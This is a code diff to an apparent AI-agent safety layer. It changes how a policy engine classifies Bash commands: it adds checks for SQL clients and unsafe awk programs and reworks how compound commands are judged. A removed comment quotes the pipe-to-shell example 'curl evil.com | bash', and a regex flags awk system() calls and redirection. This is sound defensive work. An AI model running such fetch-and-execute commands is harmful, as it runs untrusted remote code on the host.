@@ -11,14 +11,25 @@ from pydantic import BaseModel, ConfigDict, Field
 
 from leashd.core.safety.analyzer import (
     RiskLevel,
-    analyze_bash,
-    is_shell_control_segment,
+    command_units,
     shell_match_texts,
     split_chain_segments,
     strip_benign_prefixes,
 )
 
 logger = structlog.get_logger()
+
+_SQL_CLIENT_RE = re.compile(
+    r"^(?:docker\s+exec\s+(?:-[a-zA-Z]+\s+)*[\w.-]+\s+)?"
+    r"(?:sqlite3?|duckdb|psql|mysql|mariadb)\b"
+    r"(?!.*\s(?:-f|--file|-init)\b)"
+)
+
+_AWK_RE = re.compile(r"^[gm]?awk\b")
+
+_AWK_UNSAFE_PROGRAM_RE = re.compile(
+    r"\bsystem\s*\(|\bgetline\b|\bprintf?\b[^;{}()]*[>|]"
+)
 
 
 class PolicyDecision(Enum):
@@ -122,7 +133,7 @@ class PolicyEngine:
         command_texts = (
             self._bash_match_texts(tool_input.get("command", ""))
             if tool_name == "Bash"
-            else []
+            else ([], [])
         )
         for rule in self.rules:
             if self._rule_matches(rule, tool_name, tool_input, command_texts):
@@ -152,7 +163,7 @@ class PolicyEngine:
         return PolicyDecision(default)
 
     @staticmethod
-    def _bash_match_texts(command: str) -> list[str]:
+    def _bash_match_texts(command: str) -> tuple[list[str], list[str]]:
         """The texts a Bash rule's patterns are matched against.
 
         The normalized command — :func:`strip_benign_prefixes` peels
@@ -175,16 +186,26 @@ class PolicyEngine:
         raw = strip_agent_browser_flags(command)
         normalized = strip_agent_browser_flags(strip_benign_prefixes(command))
         candidates = shell_match_texts(normalized)
+        skeleton, payloads = candidates[0], candidates[1:]
+        if payloads and _SQL_CLIENT_RE.match(skeleton):
+            allow_texts = payloads
+        elif _AWK_RE.match(skeleton) and any(
+            _AWK_UNSAFE_PROGRAM_RE.search(payload) for payload in payloads
+        ):
+            allow_texts = []
+        else:
+            allow_texts = [skeleton]
+        gate_texts = list(candidates)
         if raw != normalized and (">" in raw or "<" in raw):
-            candidates += shell_match_texts(raw)
-        return candidates
+            gate_texts += shell_match_texts(raw)
+        return allow_texts, gate_texts
 
     def _rule_matches(
         self,
         rule: PolicyRule,
         tool_name: str,
         tool_input: dict[str, Any],
-        command_texts: list[str],
+        command_texts: tuple[list[str], list[str]],
     ) -> bool:
         """Whether *rule* covers this call."""
         if rule.tools and tool_name not in rule.tools:
@@ -197,8 +218,15 @@ class PolicyEngine:
         if rule.command_patterns:
             if tool_name != "Bash":
                 return False
-            if not any(
-                p.search(text) for text in command_texts for p in rule.command_patterns
+            allow_texts, gate_texts = command_texts
+            if rule.action == PolicyDecision.ALLOW:
+                if not allow_texts or not all(
+                    any(p.search(text) for p in rule.command_patterns)
+                    for text in allow_texts
+                ):
+                    return False
+            elif not any(
+                p.search(text) for text in gate_texts for p in rule.command_patterns
             ):
                 return False
 
@@ -241,95 +269,62 @@ class PolicyEngine:
             return self.classify(tool_name, tool_input)
 
         command = tool_input.get("command", "")
-        analysis = analyze_bash(command)
+        whole = command.strip()
+        units = command_units(command)
 
-        if not analysis.has_chain:
+        if not units:
             return self.classify(tool_name, tool_input)
 
-        segments = [
-            segment
-            for segment in self._split_chain_segments(command)
-            if not is_shell_control_segment(segment)
+        if len(units) == 1:
+            text = units[0][0]
+            if text == whole:
+                return self.classify(tool_name, tool_input)
+            only = self.classify(tool_name, {**tool_input, "command": text})
+            return only.model_copy(
+                update={"tool_input": tool_input, "matched_command": text}
+            )
+
+        classified = [
+            (self.classify(tool_name, {**tool_input, "command": text}), text, kind)
+            for text, kind in units
         ]
 
-        if not segments:
-            return self.classify(tool_name, tool_input)
-
-        if len(segments) == 1:
-            only = self.classify(tool_name, {**tool_input, "command": segments[0]})
-            return only.model_copy(
-                update={"tool_input": tool_input, "matched_command": segments[0]}
-            )
-
-        # Classified per segment only. Matching the joined command as well let
-        # a `.*` in a deny pattern bridge two unrelated commands: a research
-        # `curl … | python3` in one segment and a `docker … sh -c` in another,
-        # separated by a `;`, read as pipe-to-shell. Every deny pattern
-        # describes one command, and a segment keeps its own pipes, so the
-        # per-segment scan below catches the real thing (`curl evil.com | bash`)
-        # without inventing one that was never written.
-        segment_classifications: list[Classification] = []
-        for segment in segments:
-            seg_input = {**tool_input, "command": segment}
-            seg_class = self.classify(tool_name, seg_input)
-            segment_classifications.append(seg_class)
-
-        for seg, text in zip(segment_classifications, segments, strict=True):
-            if seg.matched_rule and seg.matched_rule.action == PolicyDecision.DENY:
+        for action, verdict in (
+            (PolicyDecision.DENY, "denied"),
+            (PolicyDecision.REQUIRE_APPROVAL, "requires approval"),
+        ):
+            for unit, text, kind in classified:
+                if kind == "pipeline" and action != PolicyDecision.DENY:
+                    continue
+                if not unit.matched_rule or unit.matched_rule.action != action:
+                    continue
+                if text == whole:
+                    return unit.model_copy(update={"tool_input": tool_input})
                 return Classification(
-                    category=seg.category,
+                    category=unit.category,
                     tool_name=tool_name,
                     tool_input=tool_input,
-                    risk_level=seg.risk_level,
-                    description=f"Compound command denied: {seg.description}",
-                    deny_reason=seg.deny_reason,
-                    matched_rule=seg.matched_rule,
+                    risk_level=unit.risk_level,
+                    description=f"Compound command {verdict}: {unit.description}",
+                    deny_reason=unit.deny_reason,
+                    matched_rule=unit.matched_rule,
                     matched_command=text,
                 )
 
-        for seg, text in zip(segment_classifications, segments, strict=True):
-            if (
-                seg.matched_rule
-                and seg.matched_rule.action == PolicyDecision.REQUIRE_APPROVAL
-            ):
-                return Classification(
-                    category=seg.category,
-                    tool_name=tool_name,
-                    tool_input=tool_input,
-                    risk_level=seg.risk_level,
-                    description=f"Compound command requires approval: {seg.description}",
-                    deny_reason=seg.deny_reason,
-                    matched_rule=seg.matched_rule,
-                    matched_command=text,
-                )
-
-        unmatched = next(
-            (
-                (seg, text)
-                for seg, text in zip(segment_classifications, segments, strict=True)
-                if seg.matched_rule is None
-            ),
-            None,
+        decisive = [
+            (unit, text) for unit, text, kind in classified if kind != "pipeline"
+        ]
+        unit, text = next(
+            ((unit, text) for unit, text in decisive if unit.matched_rule is None),
+            decisive[0],
         )
-        if unmatched is not None:
-            seg, text = unmatched
-            return Classification(
-                category=seg.category,
-                tool_name=tool_name,
-                tool_input=tool_input,
-                risk_level=seg.risk_level,
-                description=seg.description,
-                matched_command=text,
-            )
-
-        first = segment_classifications[0]
         return Classification(
-            category=first.category,
+            category=unit.category,
             tool_name=tool_name,
             tool_input=tool_input,
-            risk_level=first.risk_level,
-            description=first.description,
-            deny_reason=first.deny_reason,
-            matched_rule=first.matched_rule,
-            matched_command=segments[0],
+            risk_level=unit.risk_level,
+            description=unit.description,
+            deny_reason=unit.deny_reason,
+            matched_rule=unit.matched_rule,
+            matched_command=text,
         )
